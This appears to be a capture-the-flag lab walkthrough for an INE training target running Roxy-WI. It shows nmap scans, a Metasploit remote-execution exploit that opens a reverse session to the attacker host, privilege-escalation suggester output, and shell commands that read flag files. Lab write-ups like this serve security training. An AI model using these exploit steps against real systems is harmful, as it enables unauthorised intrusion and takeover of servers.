# Domain info
*Domain*: `target2.ine.local`
*ip*: `192.114.228.4`

# flags
3) 7abafe5138724285a684ab6433da68ca
4) 63b20376bc3e44c19e09b7b66ccde2b8
# Enumeration
## Port Scan
```shell
- sudo nmap --min-rate 1000 -p- target2.ine.local 
	PORT    STATE SERVICE
	80/tcp  open  http
	443/tcp open  https
	MAC Address: 02:42:C0:72:E4:04 (Unknown)
```

## Service Scan

```shell
- sudo nmap -sS -sV -A -T4 -oX scan.xml target2.ine.local

	PORT    STATE SERVICE  VERSION
	
	80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
	|_http-server-header: Apache/2.4.52 (Ubuntu)
	|_http-title: Roxy-WI
	
	443/tcp open  ssl/http Apache httpd 2.4.52
	|_http-server-header: Apache/2.4.52 (Ubuntu)
	|_http-title: Roxy-WI
	|_ssl-date: TLS randomness does not represent time
	| ssl-cert: Subject: commonName=*.roxy-wi.org/organizationName=Roxy-WI/stateOrProvinceName=Almaty/countryName=US
	| Not valid before: 2022-07-29T05:20:44
	|_Not valid after:  2050-12-14T05:20:44
	| tls-alpn: 
	|_  http/1.1
	
	MAC Address: 02:42:C0:72:E4:04 (Unknown)
	Device type: general purpose
	Running: Linux 4.X|5.X
	OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
	OS details: Linux 4.15 - 5.8
	Network Distance: 1 hop
	
	Service Info: Host: roxy-wi.example.com

```

# Exploitation
## Exploiting roxy-wi 
while browsing `target2.ine.local` python script named `overview.py` downloaded 
```shell
# exploiting
use exploit/linux/http/roxy_wi_exec
set rhosts target2.ine.local
set lhost 192.114.228.2
run

# getting session
cd /
cat flag.txt
# getting flag3
FLAG3_7abafe5138724285a684ab6433da68ca
```

## root access
```shell
# upgrading session 
session -u 1 

# running local-exploit-suggest 
- use multi/recon/local_exploit_suggester

 #   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/ansible_node_deployer                          Yes                      The target appears to be vulnerable. ansible playbook executable found                                                                                                                                                 
 2   exploit/linux/local/apport_abrt_chroot_priv_esc                    Yes                      The service is running, but could not be validated. Could not determine Apport version. apport-cli is not installed or not in $PATH.                                                                                   
 3   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.35-0ubuntu3) found on the target appears to be vulnerable                                                                                                    
 4   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.9.9.pre.1ubuntu2 is vulnerable, but unable to determine editable file. Please set EDITABLEFILE option manually 

## automation not worked so do manually
# get shell
- sessions -i 2 -C 'shell'
	/bin/bash -i
	cd /etc/cron.d
	ls -la
	cat www-data-cron
	> * * * * * www-data echo "FLAG4_63b20376bc3e44c19e09b7b66ccde2b8" 
```


